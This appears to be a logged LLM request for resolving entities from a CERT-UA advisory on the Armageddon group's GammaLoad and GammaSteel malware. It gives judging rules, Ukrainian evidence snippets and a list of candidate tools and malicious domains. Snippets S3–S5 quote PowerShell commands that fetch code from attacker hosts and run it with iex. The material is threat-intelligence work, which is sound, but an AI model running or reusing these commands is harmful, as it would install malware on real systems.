=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. stage1.ps1
E3. GraphSteel
E4. GammaLoad.PS1_v2
E5. stage2.ps1
E6. TRYxaEbX [aka TRYxaEbX.ps1]
E7. z.ps1
E8. OUTSTEEL
E9. microsoft-cortana.exe
E10. TRYxaEbX_2.ps1
E11. .NET Framework
E12. MarsStealer
E13. GrimPlant
E14. MSCommondll.exe
E15. Internet Explorer
E16. JesterStealer
E17. FTPGetter
E18. CredoMap_v2
E19. Hashcat
E20. needrestart
E21. Meterpreter
E22. Formbook/XLoader v2.5
E23. DarkCrystal RAT [aka MSCommonDriver.DCRat.exe]
E24. Pterodo
E25. PowerShell [aka powershell.exe]
E26. 223329.exe
E27. POWERGAP
E28. 62ea.exe
E29. SPECTR.Shell
E30. wscript.exe
E31. 966449.exe
E32. MS PowerPoint
E33. GammaSteel.NET
E34. HarvesterX
E35. PowerShell (powershell.exe)
E36. GammaSteel.PS1
E37. co87972.tmweb.ru
E38. acteran.ru
E39. bilitora.ru
E40. surname192.temp.swtest.ru
E41. apoxipodes.ru
E42. fishitor.ru
E43. a0695487.xsph.ru
E44. tiloraso.ru
E45. a0698649.xsph.ru
E46. billyhot.ru
E47. dodortar.ru
E48. candidar.ru
E49. lnk-upload.dodortar.ru
E50. a0698262.xsph.ru
E51. motocheck.in
E52. stormpredictor.host
E53. rmssrv3.ru
E54. meteolink.host
E55. successilin.top
E56. tortunas.ru
E57. erwini.ru
E58. mulleti.ru
E59. bul-opros.top
E60. iol.pt
E61. rmssrv2.ru
E62. toknowall.com
E63. gopoppers.com
E64. kopratiso.ru
E65. co-opros.top
E66. podologaneri.it
E67. districoperav.icu
E68. potrakit.ru
E69. giraffe-tour.ru
E70. rivierafamily.com
E71. nitikora.ru
E72. tridiuma.ru
E73. yandex.ru
E74. leonardis.ru
E75. varanasiclick.ru
E76. olei.ro
E77. s8.h.mchost.ru
E78. jevejosader.top
E79. enlamentedeunasesor.com
E80. milotrad.ru
E81. milotraf.ru
E82. lingrevelat.com
E83. aspe.ro
E84. omyce.ru
E85. pastebin.com
E86. jokotras.ru
E87. nikotod.ru
E88. mitraseo.hol.es
E89. parodadoca.ru
E90. marmaris.com.ua
E91. xsph.ru
E92. rmssrv4.ru
E93. nx0.ru
E94. ncscc.gov.ua
E95. www.msftncsi.com
E96. staystrongjewels.com
E97. wi-opros.top
E98. xcasinobonuses.net
E99. cloudflare-dns.com
E100. servebeer.com
E101. evil.server.com
E102. 3utilities.com
E103. ns.ns2-dns.com
E104. agreminj.com
E105. ns2-dns.com
E106. airmauritiusticket.com
E107. ns3-dns.com
E108. ftp.thefoodplace.net
E109. bounceme.net
E110. ddns.net
E111. netbin.host
E112. plexbd.net
E113. sytes.net
E114. brunoboys.net
E115. viewdns.net
E116. dcshost.net
E117. gov-ua.info
E118. ip-api.com
E119. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E120. dyndns.com
E121. ns.ns3-dns.com
E122. whoer.net
E123. www.hybrid-analysis.com
E124. www.facebook.com
E125. star-cz.ddns.net
E126. www.michiganmastereltiempo.com
E127. ftp.artrsllc.com
E128. project3.top
E129. www.virustotal.com [aka www.symantec.com, virustotal.com]
E130. atlantar.ru
E131. motoristo.ru
E132. moolin.ru
E133. bubenci.ru
E134. callsol.ru
E135. clipperso.ru
E136. cooperi.ru
E137. detroito.ru
E138. farafauler.ru
E139. flayga.ru
E140. ganara.ru
E141. hawksi.ru
E142. hofsteder.ru
E143. kilitro.ru
E144. kurapat.ru
E145. lnasfe.ru
E146. lopasts.ru
E147. mafirti.ru
E148. metanat.ru
E149. mitlubald.ru
E150. paparat.ru
E151. pasamart.ru
E152. qkcew.ru
E153. rncsq.ru
E154. tarlit.ru
E155. tbwelo.ru
E156. wicksl.ru
E157. xcqef.ru
E158. nxkad.ru
E159. dnslookup.seowebchecker.com
E160. tools.nexcess.net
